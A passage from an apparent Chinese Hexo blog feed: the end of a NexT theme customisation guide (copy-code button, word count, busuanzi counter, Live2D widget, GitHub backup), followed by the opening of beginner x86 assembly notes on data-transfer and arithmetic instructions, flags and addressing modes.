<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 修改背景图片</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">https://source.unsplash.com/random/1600x900?wallpapers</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>:fixed;</span><br><span class="line">  <span class="attribute">background-position</span>:<span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改主体透明度</span><br><span class="line"><span class="selector-class">.main-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改菜单栏透明度</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h2><p>在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>接着打开\themes\next\layout_macro\post.swig文件，在post-body 之后,post-footer 之前添加如下画红色部分代码（post-footer之前两个DIV）：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span>&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &#x27;passage-end-tag<span class="selector-class">.swig</span>&#x27; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure>
<p>然后打开主题配置文件（_config.yml),在末尾添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
<h2 id="加入代码块复制功能"><a href="#加入代码块复制功能" class="headerlink" title="加入代码块复制功能"></a>加入代码块复制功能</h2><h3 id="添加-copy-code-swig-文件"><a href="#添加-copy-code-swig-文件" class="headerlink" title="添加 copy-code.swig 文件"></a>添加 copy-code.swig 文件</h3><p>在 themes/next/layout/_third-party/ 下，新建 copy-code.swig 文件，内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> theme.codeblock.copy_button.enable %&#125;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .copy-btn &#123;</span><br><span class="line">      <span class="attr">display</span>: inline-block;</span><br><span class="line">      padding: 6px 12px;</span><br><span class="line">      font-size: 13px;</span><br><span class="line">      font-weight: <span class="number">700</span>;</span><br><span class="line">      line-height: 20px;</span><br><span class="line">      color: #<span class="number">333</span>;</span><br><span class="line">      white-space: nowrap;</span><br><span class="line">      vertical-align: middle;</span><br><span class="line">      cursor: pointer;</span><br><span class="line">      background-color: #eee;</span><br><span class="line">      background-image: linear-gradient(#fcfcfc, #eee);</span><br><span class="line">      border: 1px solid #d5d5d5;</span><br><span class="line">      border-radius: 3px;</span><br><span class="line">      user-select: none;</span><br><span class="line">      outline: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .highlight-wrap .copy-btn &#123;</span><br><span class="line">      <span class="attr">transition</span>: opacity .3s ease-<span class="keyword">in</span>-out;</span><br><span class="line">      opacity: <span class="number">0</span>;</span><br><span class="line">      padding: 2px 6px;</span><br><span class="line">      position: absolute;</span><br><span class="line">      right: 4px;</span><br><span class="line">      top: 8px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .highlight-wrap:hover .copy-btn,</span><br><span class="line">    .highlight-wrap .copy-btn:focus &#123;</span><br><span class="line">      <span class="attr">opacity</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .highlight-wrap &#123;</span><br><span class="line">      <span class="attr">position</span>: relative;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    $(&#x27;.highlight&#x27;).each(function (i, e) &#123;</span><br><span class="line">      var $wrap = $(&#x27;&lt;div&gt;&#x27;).addClass(&#x27;highlight-wrap&#x27;)</span><br><span class="line">      $(e).after($wrap)</span><br><span class="line">      $wrap.append($(&#x27;&lt;button&gt;&#x27;).addClass(&#x27;copy-btn&#x27;).append(&#x27;&#123;&#123;__(&quot;post.copy_button&quot;)&#125;&#125;&#x27;).on(&#x27;click&#x27;, function (e) &#123;</span><br><span class="line">        var code = $(this).parent().find(&#x27;.code&#x27;).find(&#x27;.line&#x27;).map(function (i, e) &#123;</span><br><span class="line">          return $(e).text()</span><br><span class="line">        &#125;).toArray().join(&#x27;\n&#x27;)</span><br><span class="line">        var ta = document.createElement(&#x27;textarea&#x27;)</span><br><span class="line">        document.body.appendChild(ta)</span><br><span class="line">        ta.style.position = &#x27;absolute&#x27;</span><br><span class="line">        ta.style.top = &#x27;0px&#x27;</span><br><span class="line">        ta.style.left = &#x27;0px&#x27;</span><br><span class="line">        ta.value = code</span><br><span class="line">        ta.select()</span><br><span class="line">        ta.focus()</span><br><span class="line">        var result = document.execCommand(&#x27;copy&#x27;)</span><br><span class="line">        document.body.removeChild(ta)</span><br><span class="line">        &#123;% if theme.codeblock.copy_button.show_result %&#125;</span><br><span class="line">          if(result)$(this).text(&#x27;&#123;&#123;__(&quot;post.copy_success&quot;)&#125;&#125;&#x27;)</span><br><span class="line">          else $(this).text(&#x27;&#123;&#123;__(&quot;post.copy_failure&quot;)&#125;&#125;&#x27;)</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        $(this).blur()</span><br><span class="line">      &#125;)).on(&#x27;mouseleave&#x27;, function (e) &#123;</span><br><span class="line">        var $b = $(this).find(&#x27;.copy-btn&#x27;)</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">          $b.text(&#x27;&#123;&#123;__(&quot;post.copy_button&quot;)&#125;&#125;&#x27;)</span><br><span class="line">        &#125;, 300)</span><br><span class="line">      &#125;).append(e)</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编辑-layout-swig文件"><a href="#编辑-layout-swig文件" class="headerlink" title="编辑_layout.swig文件"></a>编辑_layout.swig文件</h3><p>返回上一层，在layout文件夹下，修改 _layout.swig，在\&lt;/body&gt;上面，加上：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;_third-party/copy-code.swig&#x27;</span> %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="添加复制按钮显示的文字"><a href="#添加复制按钮显示的文字" class="headerlink" title="添加复制按钮显示的文字"></a>添加复制按钮显示的文字</h3><p>在 themes/next/languages/ 目录下，找到 在zh-CN.yml 或 在zh-Hans.yml 文件中的 post 节点，向其中添加：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">copy<span class="emphasis">_button: 复制</span></span><br><span class="line"><span class="emphasis">copy_</span>success: 复制成功</span><br><span class="line">copy<span class="emphasis">_failure: 复制失败</span></span><br></pre></td></tr></table></figure>
<p>在 en.yml 文件中同一节点位置，添加：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">copy<span class="emphasis">_button: Copy</span></span><br><span class="line"><span class="emphasis">copy_</span>success: success</span><br><span class="line">copy<span class="emphasis">_failure: Copy failed</span></span><br></pre></td></tr></table></figure>
<h3 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h3><p>更新 themes/next/_config.yml，添加：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">codeblock:</span><br><span class="line">  border<span class="emphasis">_radius:</span></span><br><span class="line"><span class="emphasis">  # Add copy button on codeblock</span></span><br><span class="line"><span class="emphasis">  copy_</span>button:</span><br><span class="line"><span class="code">    enable: true</span></span><br><span class="line"><span class="code">    # Show text copy result</span></span><br><span class="line"><span class="code">    show_result: true</span></span><br></pre></td></tr></table></figure>
<h2 id="流动线条"><a href="#流动线条" class="headerlink" title="流动线条"></a>流动线条</h2><p>在主题配置文件中，修改：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 动态线条效果，会向鼠标集中</span></span><br><span class="line">canvas<span class="emphasis">_nest:</span></span><br><span class="line"><span class="emphasis">  enable: true</span></span><br><span class="line"><span class="emphasis">  color: &#x27;0,0,255&#x27;        # color of lines, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(note: use &#x27;,&#x27; to separate.)</span></span><br><span class="line"><span class="emphasis">  pointColor: &#x27;249, 72, 137&#x27;     # color of points, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(note: use &#x27;,&#x27; to separate.)</span></span><br><span class="line"><span class="emphasis">  opacity: &#x27;0.8&#x27;               # the opacity of line (0~1), default: 0.5.</span></span><br><span class="line"><span class="emphasis">  count: &#x27;99&#x27;                  # the number of lines, default: 99.</span></span><br><span class="line"><span class="emphasis">  zIndex: &#x27;-2&#x27;                 # z-index property of the background, default: -1. 底层</span></span><br></pre></td></tr></table></figure>
<p>在文件 themes\next\layout_scripts\vendors.swig 中添加：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;# 动态线条效果 #&#125;</span><br><span class="line">&#123;% if theme.canvas<span class="emphasis">_nest &amp;&amp; theme.canvas_</span>nest.enable  %&#125;</span><br><span class="line">  &#123;% set js<span class="emphasis">_vendors.canvas_</span>nest  = &#x27;canvas-nest/canvas-nest.min.js&#x27; %&#125;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">script</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">color</span>=<span class="string">&quot;&#123;&#123; theme.canvas_nest.color &#125;&#125;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">opacity</span>=<span class="string">&quot;&#123;&#123; theme.canvas_nest.opacity &#125;&#125;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">zIndex</span>=<span class="string">&quot;&#123;&#123; theme.canvas_nest.zIndex &#125;&#125;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">count</span>=<span class="string">&quot;&#123;&#123; theme.canvas_nest.count &#125;&#125;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">src</span>=<span class="string">&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;</span> &gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="静态资源压缩"><a href="#静态资源压缩" class="headerlink" title="静态资源压缩"></a>静态资源压缩</h2><ul>
<li>安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-neat --save-dev</span><br></pre></td></tr></table></figure>
<ul>
<li>在站点目录下的_config.yml的末尾，添加配置信息:</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># hexo-neat</span></span><br><span class="line"><span class="section"># 博文压缩</span></span><br><span class="line">neat<span class="emphasis">_enable: true</span></span><br><span class="line"><span class="emphasis"># 压缩html</span></span><br><span class="line"><span class="emphasis">neat_</span>html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:  #排除的文件</span><br><span class="line">  </span><br><span class="line"><span class="section"># 压缩css  跳过min.css</span></span><br><span class="line">neat<span class="emphasis">_css:</span></span><br><span class="line"><span class="emphasis">  enable: true</span></span><br><span class="line"><span class="emphasis">  # exclude:</span></span><br><span class="line"><span class="emphasis">    # - &#x27;<span class="strong">**/<span class="emphasis">*.min.css&#x27;</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"># 压缩js 跳过min.js</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">neat_js:</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">  enable: true</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">  mangle: true</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">  output:</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">  compress:</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">  # exclude:</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">    # - &#x27;<span class="strong">**/<span class="emphasis">*.min.js&#x27;</span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">    # - &#x27;<span class="strong">**/jquery.fancybox.pack.js&#x27;</span></span></span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">    # - &#x27;**</span>/index.js&#x27;  </span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"># 压缩博文配置结束</span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"># 注意上面的路径 <span class="strong">**/<span class="emphasis">* ,需要自己去配置正确的路径。，不然生成的是空白页面，当然你也可以删掉，全部压缩。</span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure>
<h2 id="设置字数统计和预计阅读时间"><a href="#设置字数统计和预计阅读时间" class="headerlink" title="设置字数统计和预计阅读时间"></a>设置字数统计和预计阅读时间</h2><h3 id="方式一：post-wordcount-不推荐"><a href="#方式一：post-wordcount-不推荐" class="headerlink" title="方式一：post_wordcount(不推荐)"></a>方式一：post_wordcount(不推荐)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#打开cmd，进入博客根目录</span><br><span class="line"></span><br><span class="line"># 安装统计插件</span><br><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>
<p>主题配置文件：开启统计功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 实现字数统计和阅读时长的功能</span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: true</span><br><span class="line">  wordcount: true # false/true</span><br><span class="line">  min2read: true # false/true</span><br><span class="line">  totalcount: false</span><br><span class="line">  separated_meta: true</span><br></pre></td></tr></table></figure>
<h3 id="方式二：symbols-count-time-推荐"><a href="#方式二：symbols-count-time-推荐" class="headerlink" title="方式二：symbols_count_time(推荐)"></a>方式二：symbols_count_time(推荐)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#打开cmd，进入博客根目录</span><br><span class="line"></span><br><span class="line"># 安装统计插件</span><br><span class="line">npm install hexo-symbols-count-time</span><br><span class="line"></span><br><span class="line">#下载</span><br><span class="line">git clone https://github.com/theme-next/hexo-symbols-count-time.git /node_modules/hexo-symbols-count-time</span><br><span class="line">#进入目录</span><br><span class="line">cd node_modules/hexo-symbols-count-time</span><br><span class="line">#Test 测试</span><br><span class="line">npm install mocha chai --save-dev</span><br><span class="line">npm test</span><br><span class="line">#Tests with coverage 覆盖率测试</span><br><span class="line">npm install -g nyc</span><br><span class="line">nyc --print both node_modules/.bin/_mocha -- test/index.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>主题配置文件： 开启统计功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/theme-next/hexo-symbols-count-time</span><br><span class="line"># 实现字数统计和阅读时长的功能 （参考 https://github.com/theme-next/hexo-symbols-count-time）</span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_post: true</span><br><span class="line">  item_text_total: false # false/true # 总字数</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br></pre></td></tr></table></figure>
<h3 id="方式三：不蒜子统计"><a href="#方式三：不蒜子统计" class="headerlink" title="方式三：不蒜子统计"></a>方式三：不蒜子统计</h3><p>主题配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 统计访客量以及文章阅读量</span><br><span class="line"># NexT主题集成了不蒜子统计功能</span><br><span class="line">busuanzi_count:</span><br><span class="line">  # count values only if the other configs are false</span><br><span class="line">  enable: true # false/true 是否开启不蒜子统计功能</span><br><span class="line">  # custom uv span for the whole site</span><br><span class="line">  # 效果：本站访客数12345人次</span><br><span class="line">  site_uv: true</span><br><span class="line">  #本站访客数</span><br><span class="line">  site_uv_header: 本站访客数 &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;</span><br><span class="line">  site_uv_footer: 人次</span><br><span class="line">  # custom pv span for the whole site</span><br><span class="line">  # 效果：本站总访问量12345次（一般不开启这个）</span><br><span class="line">  site_pv: true</span><br><span class="line">  #本站总访问量</span><br><span class="line">  site_pv_header: 本站总访问量 &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;</span><br><span class="line">  site_pv_footer: 次</span><br><span class="line">  # custom pv span for one page only</span><br><span class="line">  ## 效果：本文总阅读量12345次</span><br><span class="line">  page_pv: true</span><br><span class="line">  #本文总阅读量</span><br><span class="line">  page_pv_header: 本文总阅读量 &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt;</span><br><span class="line">  page_pv_footer: 次</span><br></pre></td></tr></table></figure>
<p>hexo博客解决不蒜子统计无法显示问题：</p>
<p>首先需要先找到NexT下引用不蒜子统计的方法。文件路径为/theme/next/layout/_third-party/analytics/busuanzi-counter.swig文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--修改前--&gt;</span><br><span class="line">  &lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!--修改后--&gt;</span><br><span class="line">  &lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>主题文件中搜索，post_copyright,改为true即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Declare license on posts</span><br><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  license: CC BY-NC-SA 3.0</span><br><span class="line">  license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/</span><br></pre></td></tr></table></figure>
<h2 id="添加Live2D-萌宠"><a href="#添加Live2D-萌宠" class="headerlink" title="添加Live2D 萌宠"></a>添加Live2D 萌宠</h2><h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>进入到工程目录下，安装 Hexo 插件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-helper-live2d --save</span><br></pre></td></tr></table></figure>
<h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><p>在 插件作者的博客 中挑选一个模型，记录该模型的名字。模型资源名称为 live2d-widget-model-模型名称，例如选择模型 shizuku ，则其对应的 Live2D 资源名称为 live2d-widget-model-shizuku，然后直接在站点根目录下安装该模型，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install live2d-widget-model-shizuku --save</span><br></pre></td></tr></table></figure>
<h3 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h3><p>编辑站点配置文件，添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Hexo plugin: hexo-helper-live2d</span><br><span class="line">## https://github.com/EYHN/hexo-helper-live2d</span><br><span class="line">live2d:</span><br><span class="line">  enable: true #控制live2d插件是否生效</span><br><span class="line">  pluginRootPath: live2dw/ # Root path of plugin to be on the site (Relative)</span><br><span class="line">  pluginJsPath: lib/ # JavaScript path related to plugin&#x27;s root (Relative)</span><br><span class="line">  pluginModelPath: assets/ # Relative model path related to plugin&#x27;s root (Relative)</span><br><span class="line">  scriptFrom: local # Default l2dwidget.js使用的CDN地址，local表示使用本地地址</span><br><span class="line">  #scriptFrom: jsdelivr # jsdelivr CDN</span><br><span class="line">  #scriptFrom: unpkg # unpkg CDN</span><br><span class="line">  #scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # Your custom url</span><br><span class="line">  tagMode: false # Whether only to replace live2d tag instead of inject to all pages</span><br><span class="line">  log: false # Whether to show logs in console</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-shizuku # npm-module package name</span><br><span class="line">    #use: wanko # folder name in (hexo base dir)/live2d_models/</span><br><span class="line">    #use: ./wives/wanko # folder path relative to hexo base dir</span><br><span class="line">    #use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # Your custom url</span><br><span class="line">    scale: 1</span><br><span class="line">    hHeadPos: 0.5</span><br><span class="line">    vHeadPos: 0.618</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2 #超采样等级</span><br><span class="line">    width: 150 #宽度</span><br><span class="line">    height: 300 #canvas的高度</span><br><span class="line">    position: right #显示位置左或右</span><br><span class="line">    hOffset: 0 #canvas水平偏移</span><br><span class="line">    vOffset: -10 #canvas水平偏移</span><br><span class="line">  mobile:</span><br><span class="line">    show: false #控制是否在移动设备上显示</span><br><span class="line">    scale: 0.05 #移动设备上的缩放</span><br><span class="line">  react:</span><br><span class="line">    opacityDefault: 0.7 #默认透明度</span><br><span class="line">    opacityOnHover: 0.2 #鼠标移上透明度</span><br></pre></td></tr></table></figure>
<h2 id="hexo博客备份"><a href="#hexo博客备份" class="headerlink" title="hexo博客备份"></a>hexo博客备份</h2><ol>
<li>在博客仓库创建一个分支hexo（命名随意）</li>
<li>设置hexo为默认分支</li>
<li>将此时的博客仓库clone到本地（使用github桌面版），将之前的本地博客文件夹中的_config.yml，themes/，source，scffolds/，package.json，.gitignore复制到刚刚克隆下来的仓库文件夹，即Username.github.io；（Username为自己的用户名）</li>
<li>将themes/next/(我用的是Next主题)中的./git删除，否则无法将主题文件夹push</li>
<li>在刚刚克隆的文件夹中执行npm install,npm install hexo-deployer-git（这里看看分支是不是显示hexo）</li>
<li>执行(git add .),git commit -m “提交文件”,git push origin hexo 来提交hexo网站源文件</li>
<li>执行hexo g -d生成静态网页部署到github上</li>
</ol>
<p>这样，Username.github.io仓库就有master分支保存静态网页，hexo分支保存源文件。</p>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>在本地对博客修改（包括修改主题样式、发布新文章等）后</p>
<ol>
<li><p>执行git add .，git commit -m “提交文件”，git push origin hexo来提交Hexo网站源文件；</p>
</li>
<li><p>执行hexo g -d 生成静态网页部署到github上；</p>
</li>
</ol>
<p>（每次发布重复这两步，它们之间没有严格的顺序）</p>
<p>参考链接：<a href="https://blog.csdn.net/weixin_41599858/java/article/details/104806723">https://blog.csdn.net/weixin_41599858/java/article/details/104806723</a></p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编学习笔记</title>
    <url>/2020/01/18/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="汇编的简单学习笔记"><a href="#汇编的简单学习笔记" class="headerlink" title="汇编的简单学习笔记"></a>汇编的简单学习笔记</h3><span id="more"></span>
<h4 id="简单传送指令"><a href="#简单传送指令" class="headerlink" title="简单传送指令"></a>简单传送指令</h4><h5 id="传送指令"><a href="#传送指令" class="headerlink" title="传送指令"></a>传送指令</h5><p><strong>MOV DEST，SRC</strong> （DEST &lt;= SRC）<br>操作数尺寸必须保持一致<br>立即数永远不能作为目的操作数，CS寄存器不能做目的操作数。EIP不能作为操作数。<br>不影响各标志位状态。<br><img src="/2020/01/18/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/汇编笔记图片.png" alt="图片"></p>
<h5 id="交换指令"><a href="#交换指令" class="headerlink" title="交换指令"></a>交换指令</h5><p><strong>XCHG OPRD1,OPRD2</strong><br>内容交换<br>不能同时是存储单元，也不能有立即数。操作数尺寸一致。</p>
<h4 id="简单加减指令"><a href="#简单加减指令" class="headerlink" title="简单加减指令"></a>简单加减指令</h4><h5 id="加法指令"><a href="#加法指令" class="headerlink" title="加法指令"></a>加法指令</h5><p><strong>ADD DEST，SRC</strong> （DEST &lt;= DEST + SRC）<br>带进位的加法指令<br><strong>ADC DEST，SRC</strong> （DEST &lt;= DEST + SRC + CF）<br>加法指令ADD，ADC影响标志寄存器中的有关状态标志。</p>
<h5 id="减法指令"><a href="#减法指令" class="headerlink" title="减法指令"></a>减法指令</h5><p><strong>SUB DEST，SRC</strong> （DEST &lt;= DEST-SRC）<br>带借位的减法指令<br><strong>SBB DEST，SRC</strong> （DEST - SRC - CF = DEST）<br>减法指令SUB，SBB影响标志寄存器中的有关状态标志。</p>
<h5 id="加一指令"><a href="#加一指令" class="headerlink" title="加一指令"></a>加一指令</h5><p><strong>INC DEST</strong>  （DEST &lt;= DEST + 1）<br>不影响标志寄存器中的进位标志（CF），会影响其他状态标志。</p>
<h5 id="减一指令"><a href="#减一指令" class="headerlink" title="减一指令"></a>减一指令</h5><p><strong>DEC DEST</strong> （DEST &lt;= DEST -1)<br>不影响标志寄存器中的进位标志（CF），会影响其他状态标志。</p>
<h5 id="去补指令"><a href="#去补指令" class="headerlink" title="去补指令"></a>去补指令</h5><p><strong>NEG OPRD</strong> （OPRD &lt;= 0-OPRD)<br>会影响标志寄存器中的有关状态标志。如果操作数为0，那么使得进位标志为0，否则进位标志为1。</p>
<h4 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h4><div class="table-container">
<table>
<thead>
<tr>
<th><strong>状态标志</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>进位标志（CF）</td>
<td>主要反应算数运算是否产生进位或借位。如果运算结果的最高位产生一个进位或借位，则CF被置1，否则CF被清0。</td>
</tr>
<tr>
<td>零标志（ZF）</td>
<td>反应运算结果是否为0. 如果运算结果为0，则ZF被置1，否则ZF被清0。</td>
</tr>
<tr>
<td>符号标志（SF）</td>
<td>反应运算结果的符号位。SF与运算结果的最高位相同，如果运算结果的最高位为1，则SF被置1，否则被清0。<strong>二进制表示的最高位</strong></td>
</tr>
<tr>
<td>溢出标志（OF）</td>
<td>反应<strong>有符号数</strong>加减运算是否引起溢出。如果溢出，OF置1，否则清0 （正数加上正数变成负数，负数加上负数变成正数。正数减去负数变成负数，负数减去正数变成正数）</td>
</tr>
<tr>
<td>奇偶标志（PF）</td>
<td>反应运算结果<strong>最低字节</strong>中含有“1”的位数是偶数还是奇数。是偶数，PF置1，否则，清0. （可进行奇偶校验）</td>
</tr>
<tr>
<td>辅助进位标志（AF）</td>
<td>反应算术运算中第3位是否产生进位或借位，或者最低的4位是否有进位或借位。如果产生进位或借位，AF置1，否则清0。</td>
</tr>
</tbody>
</table>
</div>
<h4 id="状态标志操作指令"><a href="#状态标志操作指令" class="headerlink" title="状态标志操作指令"></a>状态标志操作指令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>清进位标志指令（CLC）</td>
<td>使进位标志CF为0</td>
</tr>
<tr>
<td>置进位标志指令（STC）</td>
<td>使进位标志CF为1</td>
</tr>
<tr>
<td>进位标志取反指令（CMC）</td>
<td>使进位标志CF取反</td>
</tr>
<tr>
<td>获取状态标志操作（LAHF）</td>
<td>把标志寄存器的低8位，送到通用寄存器AH中。对标志位自身不产生影响。</td>
</tr>
<tr>
<td>设置状态标志操作指令（SAHF）</td>
<td>对标志寄存器中低8位状态标志产生影响，使得SF，ZF，AF，PF和CF分别成为来自寄存器AH中对应位的值，但保留位（位1，位3和位5）不受影响</td>
</tr>
</tbody>
</table>
</div>
<h4 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h4><p><strong>立即寻址</strong><br>操作数是立即数。<br><strong>寄存器寻址</strong><br><strong>直接寻址</strong><br>操作数在存储器中。直接寻址的地址要放在括号中，在源程序中，往往用变量名表示。<br><strong>寄存器间接寻址</strong><br>操作数在存储器中。</p>
